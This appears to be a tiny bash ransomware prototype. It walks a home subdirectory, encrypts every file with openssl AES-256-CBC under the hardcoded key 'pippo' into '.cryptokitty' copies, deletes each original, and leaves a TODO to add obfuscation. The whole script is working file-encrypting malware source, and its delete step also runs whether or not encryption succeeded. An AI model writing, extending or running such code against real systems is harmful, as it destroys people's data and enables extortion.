#for every file in the chosen directory
for f in `find /home/cavaz/prova -type f`; do
echo $f
#i encrypt with extension .criptokitty and i use the key "pippo", then i remove the clear text files leaving only the crypted ones
[ -f $f ] && openssl enc -aes-256-cbc -in $f -k pippo -out $f.cryptokitty ; rm $f

done

#TODO make obfuscation




